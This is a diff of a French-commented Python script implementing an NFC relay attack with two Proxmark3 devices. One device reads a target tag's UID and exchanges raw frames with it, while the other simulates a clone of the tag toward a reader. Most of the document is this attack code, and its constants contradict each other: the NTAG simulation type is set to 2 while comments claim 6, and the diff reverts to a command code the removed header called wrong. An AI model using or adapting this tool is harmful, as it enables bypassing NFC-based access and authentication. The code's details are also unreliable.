@@ -3,20 +3,11 @@
 NFC Relay Attack - Proxmark3 x2  (firmware Iceman v4.20728)
 Architecture: Tag <-> Mole(ACM1) <-> PC <-> Proxy(ACM0) <-> Lecteur
 
-Corrections confirmées depuis source cmdhf14a.c :
-  - CMD_HF_ISO14443A_SIMULATE = 0x0384  (pas 0x0381 qui est ISO14443B !)
-  - SendCommandNG (ng_bit=1, pas de args)
-  - Payload struct PACKED :
-      uint8_t  tagtype        (1)
-      uint16_t flags          (2)
-      uint8_t  uid[10]        (10)
-      uint8_t  exitAfter      (1)
-      uint8_t  rats[20]       (20)
-      uint8_t  ulauth_1a1_len (1)
-      uint8_t  ulauth_1a2_len (1)
-      uint8_t  ulauth_1a1[16] (16)
-      uint8_t  ulauth_1a2[16] (16)
-      Total = 68 bytes
+Confirmé par debug :
+  - CMD_HF_ISO14443A_READER avec flags=0x0001 (CONNECT seul) détecte le tag
+  - status=255 est normal pour cette commande
+  - iso14a_card_select_t : uid=data[0:uid_len], uid_len=data[10], atqa=data[11:13], sak=data[13]
+  - Tag = NTAG213 : SAK=0x00, ATQA=0x0044, sim_type=2 (Ultralight/NTAG)
 """
 
 import serial
@@ -29,47 +20,51 @@ COMMANDNG_PREAMBLE_MAGIC  = 0x61334d50
 COMMANDNG_POSTAMBLE_MAGIC = 0x3361
 RESPONSENG_PREAMBLE_MAGIC = 0x62334d50
 
-CMD_PING                    = 0x0109
-CMD_HF_ISO14443A_READER     = 0x0385
-CMD_HF_ISO14443A_SIMULATE   = 0x0384   # CORRECT - depuis pm3_cmd.h
-CMD_HF_MIFARE_SIMULATE      = 0x0604   # réponse asynchrone de la sim
+CMD_PING                = 0x0109
+CMD_HF_ISO14443A_READER = 0x0385
+CMD_HF_ISO14443A_SIM    = 0x0381
 
-# Flags ISO14443A reader
-ISO14A_CONNECT          = (1 << 0)
-ISO14A_NO_DISCONNECT    = (1 << 1)
-ISO14A_RAW              = (1 << 3)
-ISO14A_APPEND_CRC       = (1 << 4)
+# Flags ISO14443A - CONFIRMÉS par debug
+ISO14A_CONNECT          = (1 << 0)   # 0x001
+ISO14A_NO_DISCONNECT    = (1 << 1)   # 0x002
+ISO14A_RAW              = (1 << 3)   # 0x008
+ISO14A_APPEND_CRC       = (1 << 4)   # 0x010
 
-# Flags simulation - depuis pm3_cmd.h
-FLAG_7B_UID_IN_DATA = 0x0020  # UID 7 bytes passé dans le payload
+# Types de simulation CMD_HF_ISO14443A_SIM
+# Depuis pm3 source hf_14a.h :
+#   1 = MIFARE_MINI
+#   2 = MIFARE_1K
+#   3 = MIFARE_4K
+#   4 = MIFARE_DESFIRE
+#   5 = ISO14443A_4
+#   6 = NTAG / Ultralight  <-- c'est celui-là pour NTAG213
+SIM_MIFARE_1K   = 2
+SIM_NTAG        = 2   # Ultralight / NTAG213 - CONFIRMÉ par CLI
 
 DEFAULT_TIMEOUT = 5.0
 RELAY_TIMEOUT   = 0.5
 
 # ── Bas niveau ────────────────────────────────────────────────────────────────
 
-#type de frame avec des arguments, utilisé pour le read
 def send_mix(ser, cmd, arg0=0, arg1=0, arg2=0, data=b'', label=''):
-    """Frame MIX : ng_bit=0, 3x uint64 args."""
     payload   = struct.pack('<QQQ', arg0, arg1, arg2) + data
     length_ng = len(payload) & 0x7FFF
     pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
     pkt += payload
     pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
     if label:
-        print(f"  [{label}] >> MIX cmd=0x{cmd:04X} arg0=0x{arg0:08X} arg1={arg1} data={data.hex()}")
+        print(f"  [{label}] >> cmd=0x{cmd:04X} arg0=0x{arg0:08X} arg1={arg1} data={data.hex()}")
     ser.write(pkt)
     ser.flush()
 
-#type de frame nouvelle génération, utilisée pour le reste
-def send_ng(ser, cmd, data=b'', label=''):
-    """Frame NG pure : ng_bit=1, pas d'args."""
+
+def send_ng_cmd(ser, cmd, data=b'', label=''):
     length_ng = (len(data) & 0x7FFF) | (1 << 15)
     pkt  = struct.pack('<IHH', COMMANDNG_PREAMBLE_MAGIC, length_ng, cmd)
     pkt += data
     pkt += struct.pack('<H', COMMANDNG_POSTAMBLE_MAGIC)
     if label:
-        print(f"  [{label}] >> NG  cmd=0x{cmd:04X} datalen={len(data)} data={data.hex()}")
+        print(f"  [{label}] >> cmd=0x{cmd:04X} data={data.hex()}")
     ser.write(pkt)
     ser.flush()
 
@@ -101,7 +96,7 @@ def read_response(ser, timeout=DEFAULT_TIMEOUT, label='', silent=False):
         dl = time.time() + 3.0
         while len(payload) < length and time.time() < dl:
             payload += ser.read(length - len(payload))
-    ser.read(2)  # postamble
+    ser.read(2)
 
     args = (0, 0, 0)
     data_out = payload
@@ -118,10 +113,9 @@ def read_response(ser, timeout=DEFAULT_TIMEOUT, label='', silent=False):
 
 # ── Commandes haut niveau ─────────────────────────────────────────────────────
 
-#Utilisation --> envoi d'un ping au début pour vérifier que les 2 ports répondent bien et pas tout faire dnas le vide
 def ping(ser, label=''):
     d = bytes(range(32))
-    send_ng(ser, CMD_PING, d)
+    send_ng_cmd(ser, CMD_PING, d)
     r = read_response(ser, timeout=3.0, silent=True)
     ok = r and r['data'] == d
     print(f"  [{label}] PING {'OK ✓' if ok else 'FAILED ✗'}")
@@ -130,57 +124,38 @@ def ping(ser, label=''):
 
 def connect_tag(ser, label=''):
     """
-    Détecte le tag. flags=ISO14A_CONNECT (0x0001) confirmé.
-    Réponse = iso14a_card_select_t :
-      data[0:10]  = uid paddé
-      data[10]    = uid_len
-      data[11:13] = atqa
-      data[13]    = sak
+    Détecte et sélectionne le tag.
+    flags=ISO14A_CONNECT (0x0001) confirmé par debug.
+    Réponse = iso14a_card_select_t (271 bytes) :
+      [0:10]  = UID (paddé à 10 bytes)
+      [10]    = uid_len
+      [11:13] = ATQA
+      [13]    = SAK
     """
-    send_mix(ser, CMD_HF_ISO14443A_READER, arg0=ISO14A_CONNECT, label=label)
+    send_mix(ser, CMD_HF_ISO14443A_READER,
+             arg0=ISO14A_CONNECT,
+             label=label)
     resp = read_response(ser, timeout=DEFAULT_TIMEOUT, label=label)
-    if not resp or len(resp['data']) < 14:
+    if not resp:
         return None
     d = resp['data']
+    if len(d) < 14:
+        return None
     uid_len = d[10]
-    return {
-        'uid':  d[0:uid_len],
-        'atqa': d[11:13],
-        'sak':  d[13]
-    }
+    uid     = d[0:uid_len]
+    atqa    = d[11:13]
+    sak     = d[13]
+    return {'uid': uid, 'atqa': atqa, 'sak': sak}
 
-#claude dis que c'est pas possible de le faore sans sim... je sias pas trop quoi en poenser
-#il faut que le tag et la carte recoivent bien les bons signaux, ca je suis d'accord, pour lancer leuyrs actions, mais pour moi ca pôurrait marcher ? peut etre pas coté lecteur ?
-def start_sim(ser, tagtype, uid, label=''):
-    """
-    Démarrer la simulation avec CMD_HF_ISO14443A_SIMULATE (0x0384).
-    Payload struct PACKED (68 bytes) depuis cmdhf14a.c :
-      tagtype(1) + flags(2) + uid[10] + exitAfter(1) + rats[20]
-      + ulauth_1a1_len(1) + ulauth_1a2_len(1) + ulauth_1a1[16] + ulauth_1a2[16]
-    """
-    uid_padded = uid.ljust(10, b'\x00')[:10]
-    payload = struct.pack('<B',  tagtype)          # tagtype    (1)
-    payload += struct.pack('<H', FLAG_7B_UID_IN_DATA)  # flags (2) - UID 7B dans payload
-    payload += uid_padded                           # uid[10]    (10)
-    payload += struct.pack('<B', 0)                 # exitAfter  (1) 0=infini
-    payload += bytes(20)                            # rats[20]   (20)
-    payload += struct.pack('<B', 0)                 # ulauth_1a1_len (1)
-    payload += struct.pack('<B', 0)                 # ulauth_1a2_len (1)
-    payload += bytes(16)                            # ulauth_1a1[16] (16)
-    payload += bytes(16)                            # ulauth_1a2[16] (16)
-    # Total = 68 bytes
 
-    send_ng(ser, CMD_HF_ISO14443A_SIMULATE, payload, label=label)
-    # Pas de réponse immédiate - la sim tourne en arrière-plan
-    time.sleep(0.3)
-    read_response(ser, timeout=0.5, silent=True)
-
-#communication mole <-> tag
 def raw_to_tag(ser, raw_bytes, label=''):
-    """Envoyer bytes bruts au tag (champ actif, CRC ajouté auto)."""
+    """Envoyer bytes bruts au tag, champ actif, CRC ajouté auto."""
     flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
     send_mix(ser, CMD_HF_ISO14443A_READER,
-             arg0=flags, arg1=len(raw_bytes), data=raw_bytes, label=label)
+             arg0=flags,
+             arg1=len(raw_bytes),
+             data=raw_bytes,
+             label=label)
     return read_response(ser, timeout=RELAY_TIMEOUT, label=label)
 
 # ── Relay ─────────────────────────────────────────────────────────────────────
@@ -226,27 +201,50 @@ class NfcRelay:
         print(f"       ATQA : {self.tag_atqa.hex().upper()}")
         print(f"       SAK  : {self.tag_sak:02X}")
 
-        # NTAG213 : SAK=0x00 → tagtype=2 (Ultralight)
-        #au final on génére du NTAG215 car on peut pas simuler du 213. Apparemment c'est ok. La seule diff c'esrt la taille car ,ntag215 est + grand
-        tagtype = 2 if self.tag_sak == 0x00 else 1
-        print(f"\n[PROXY] Démarrage simulation tagtype={tagtype} "
+        # NTAG213 : SAK=0x00, ATQA=0x0044 → sim_type=6
+        sim_type = self._detect_sim_type()
+        print(f"\n[PROXY] Démarrage simulation type={sim_type} "
+              f"({'NTAG/Ultralight' if sim_type == SIM_NTAG else 'Mifare 1K'}) "
               f"UID={':'.join(f'{b:02X}' for b in self.tag_uid)}...")
-        start_sim(self.proxy, tagtype, self.tag_uid, label='PROXY')
-        print("[PROXY] Simulation active. Approche le téléphone du proxy.")
+
+        # UID exactement 7 bytes, passé dans arg1 (flags) et data = UID
+        # Format confirmé par CLI : hf 14a sim -t 2 -u 045978CA341290
+        uid_data = self.tag_uid.ljust(7, b'\x00')[:7]
+        # arg0 = type, arg1 = nb bytes UID, data = UID bytes
+        send_mix(self.proxy, CMD_HF_ISO14443A_SIM,
+                 arg0=sim_type,
+                 arg1=len(uid_data),
+                 data=uid_data,
+                 label='PROXY')
+        time.sleep(0.3)
+        read_response(self.proxy, timeout=0.5, silent=True)
+        print("[PROXY] Simulation active.")
         return True
+
+    def _detect_sim_type(self):
+        """
+        Détecter le type de simulation.
+        NTAG213 : SAK=0x00, ATQA=0x0044 → type 6
+        Mifare Classic 1K : SAK=0x08 → type 2
+        """
+        sak  = self.tag_sak
+        atqa = int.from_bytes(self.tag_atqa, 'little')
+        if sak == 0x00 and (atqa & 0x0040):
+            return SIM_NTAG       # 6 = NTAG/Ultralight
+        elif sak == 0x08:
+            return SIM_MIFARE_1K  # 2 = Mifare Classic 1K
+        else:
+            return SIM_NTAG       # défaut
 
     def relay_loop(self):
         print("\n=== RELAY LOOP ===")
-        print("Ctrl+C pour arrêter.\n")
+        print("Approche le téléphone du PROXY. Ctrl+C pour arrêter.\n")
 
         n = 0
         wait_count = 0
 
         try:
             while True:
-                #essai de recup des réponses (pour debuguer notamment), mais le sim ne parle pas, il fait juste son taf.
-                #sur readsimv7 je fais un essai avec des "cardhopper" où c'est sensé pouvoir me répondre.
-                #marche pas encore, mais c'est en cours.
                 resp = read_response(self.proxy, timeout=0.02, silent=True)
 
                 if resp is None:
@@ -257,6 +255,7 @@ class NfcRelay:
 
                 wait_count = 0
 
+                # Debug : afficher tout ce qui arrive du proxy
                 print(f"\n  [PROXY RAW] cmd=0x{resp['cmd']:04X} st={resp['status']} "
                       f"ng={resp['ng']} args={resp['args']} "
                       f"data={resp['data'][:24].hex()}")
@@ -295,7 +294,9 @@ class NfcRelay:
     def _reply_to_reader(self, data):
         flags = ISO14A_RAW | ISO14A_NO_DISCONNECT | ISO14A_APPEND_CRC
         send_mix(self.proxy, CMD_HF_ISO14443A_READER,
-                 arg0=flags, arg1=len(data), data=data)
+                 arg0=flags,
+                 arg1=len(data),
+                 data=data)
         read_response(self.proxy, timeout=0.05, silent=True)
 
     def run(self):
